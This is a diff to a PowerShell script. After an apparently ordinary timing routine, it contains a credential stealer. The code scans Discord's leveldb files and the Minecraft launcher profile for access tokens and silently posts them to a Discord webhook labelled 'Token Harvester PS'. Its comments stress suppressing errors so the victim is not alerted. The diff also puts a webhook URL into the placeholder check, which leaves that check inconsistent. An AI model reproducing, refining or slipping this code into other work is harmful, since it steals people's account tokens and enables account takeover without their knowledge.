@@ -129,8 +129,9 @@ $sw.stop()
 $t = $sw.Elapsed.TotalMinutes
 Write-Host ""
 Write-Host "Elapsed Time $t Minutes" -ForegroundColor Yellow
+
 # --- CONFIGURACIÓN DE RECOLECCIÓN DE TOKENS ---
-# ¡Pega aquí la URL de tu Webhook de Discord obtenida en el Paso 0!
+# ¡Pega aquí la URL de tu Webhook de Discord!
 $WebhookURL = "TU_URL_DE_WEBHOOK_DE_DISCORD_AQUI" 
 # ------------------------------------
 
@@ -140,41 +141,46 @@ function Send-ToWebhook {
         [string]$TypeOfData = "tokens"
     )
 
-    if ([string]::IsNullOrEmpty($WebhookURL) -or $WebhookURL -eq "TU_URL_DE_WEBHOOK_DE_DISCORD_AQUI") {
-        # No mostrar errores de webhook al usuario final
+    # Si la URL del Webhook no está configurada, o aún tiene el valor por defecto, no se envía nada.
+    if ([string]::IsNullOrEmpty($WebhookURL) -or $WebhookURL -eq "https://discord.com/api/webhooks/1549215227642515526/QGVl4Mhs292huTbTuydukOr2eBOLWvfWKH0z5pLPw_Tcn8h9Tg26OJKnfKC8yEH8v8mj") {
         return
     }
 
-    $Payload = @{
-        "content" = "**Nuevos $TypeOfData recolectados!**`n```json`n$Data`n```"
-        "username" = "Token Harvester PS"
-        "avatar_url" = "https://i.imgur.com/4M34hi2.png" 
-    } | ConvertTo-Json -Compress
+    # Construir el JSON del payload utilizando un here-string para mayor robustez
+    # y para evitar problemas de parsing con Invoke-Expression cuando el script se descarga.
+    $JsonPayload = @"
+{
+    "content": "**Nuevos $TypeOfData recolectados!**`n```json`n$Data`n```",
+    "username": "Token Harvester PS",
+    "avatar_url": "https://i.imgur.com/4M34hi2.png" 
+}
+"@
 
     try {
         # Invocar la petición POST al webhook
-        Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $Payload -ContentType 'application/json' | Out-Null
-        # | Out-Null es importante para que no imprima nada en la consola
+        # "| Out-Null" es importante para que no imprima nada en la consola del usuario.
+        Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $JsonPayload -ContentType 'application/json' | Out-Null
     } catch {
-        # Silenciar errores de envío al webhook
+        # Silenciar cualquier error durante el envío al webhook para no alertar al usuario.
     }
 }
 
 function Get-DiscordTokens {
     $Tokens = New-Object System.Collections.Generic.List[string]
-    $AppDataPaths = @(
-        "$env:APPDATA\Discord",
-        "$env:APPDATA\discordcanary",
-        "$env:APPDATA\discordptb"
-        # Omitiendo navegadores para mantener la simplicidad y evitar la necesidad de descifrado DPAPI en este script de ejemplo
+    # Rutas comunes donde Discord almacena sus tokens en archivos leveldb
+    $AppDataPaths = @(         "$env:APPDATA\Discord",         "$env:APPDATA\discordcanary",         "$env:APPDATA\discordptb"
+        # Omitiendo navegadores para mantener la simplicidad y evitar la necesidad de descifrado DPAPI,
+        # que requeriría más permisos y complejidad.
     )
 
     foreach ($Path in $AppDataPaths) {
         if (Test-Path $Path) {
+            # Buscar en archivos .ldb y .log dentro de cualquier subdirectorio leveldb
             Get-ChildItem -Path $Path -Filter "*.ldb", "*.log" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
                 try {
-                    # Lee el contenido del archivo como texto crudo (raw)
+                    # Lee el contenido del archivo como texto crudo (Raw)
                     $Content = Get-Content $_.FullName -Encoding UTF8 -ErrorAction SilentlyContinue -Raw
+                    # Expresión regular para encontrar tokens de Discord
                     $Matches = [regex]::Matches($Content, '[\w-]{24}\.[\w-]{6}\.[\w-]{27,}')
                     foreach ($Match in $Matches) {
                         if (-not $Tokens.Contains($Match.Value)) {
@@ -182,23 +188,27 @@ function Get-DiscordTokens {
                         }
                     }
                 } catch {
-                    # Silenciar errores al leer archivos
+                    # Silenciar errores al leer archivos para no generar ruido.
                 }
             }
         }
     }
+    # Devuelve los tokens encontrados en formato JSON.
     return $Tokens | ConvertTo-Json -Compress
 }
 
 function Get-MinecraftSessionTokens {
     $Tokens = New-Object System.Collections.Generic.List[string]
+    # Ruta estándar del archivo de perfiles del launcher de Minecraft.
     $LauncherProfilesPath = "$env:APPDATA\.minecraft\launcher_profiles.json"
 
     if (Test-Path $LauncherProfilesPath) {
         try {
+            # Lee y parsea el archivo JSON del launcher de Minecraft.
             $Content = Get-Content $LauncherProfilesPath -Raw -Encoding UTF8
             $ProfilesData = $Content | ConvertFrom-Json
 
+            # Busca tokens en 'authenticationDatabase' (para el launcher de Mojang/Microsoft).
             if ($ProfilesData.authenticationDatabase) {
                 foreach ($Entry in $ProfilesData.authenticationDatabase.GetEnumerator()) {
                     if ($Entry.Value.accessToken) {
@@ -208,6 +218,7 @@ function Get-MinecraftSessionTokens {
                     }
                 }
             }
+            # Busca tokens en 'profiles' (para versiones antiguas o launchers personalizados).
             if ($ProfilesData.profiles) {
                  foreach ($Entry in $ProfilesData.profiles.GetEnumerator()) {
                     if ($Entry.Value.accessToken) {
@@ -218,26 +229,30 @@ function Get-MinecraftSessionTokens {
                 }
             }
         } catch {
-            # Silenciar errores de lectura/parseo JSON
+            # Silenciar errores durante la lectura o parsing del JSON.
         }
     }
+    # Devuelve los tokens de Minecraft encontrados en formato JSON.
     return $Tokens | ConvertTo-Json -Compress
 }
 
-# --- Bloque de ejecución principal para la recolección de tokens (se ejecuta en segundo plano) ---
-$AllCollectedTokens = @{}
+# --- Bloque de ejecución principal para la recolección de tokens ---
+# Este bloque se ejecuta automáticamente cuando el script es invocado.
+# Recopila los tokens y los envía al Webhook de Discord.
+$AllCollectedTokens = @{} # Almacenará todos los tokens encontrados.
 
 $DiscordTokensJson = Get-DiscordTokens
-if ($DiscordTokensJson -ne "[]") {
+if ($DiscordTokensJson -ne "[]") { # Si se encontraron tokens de Discord
     $AllCollectedTokens.Add("discord_tokens", ($DiscordTokensJson | ConvertFrom-Json))
 }
 
 $MinecraftTokensJson = Get-MinecraftSessionTokens
-if ($MinecraftTokensJson -ne "[]") {
+if ($MinecraftTokensJson -ne "[]") { # Si se encontraron tokens de Minecraft
     $AllCollectedTokens.Add("minecraft_tokens", ($MinecraftTokensJson | ConvertFrom-Json))
 }
 
+# Si se encontraron tokens de cualquier tipo, se envían al Webhook.
 if ($AllCollectedTokens.Count -gt 0) {
     Send-ToWebhook -Data ($AllCollectedTokens | ConvertTo-Json -Compress) -TypeOfData "tokens"
 }
-# -------------------------------------------------------------------------------------------------
+# -------------------------------------------------------------------
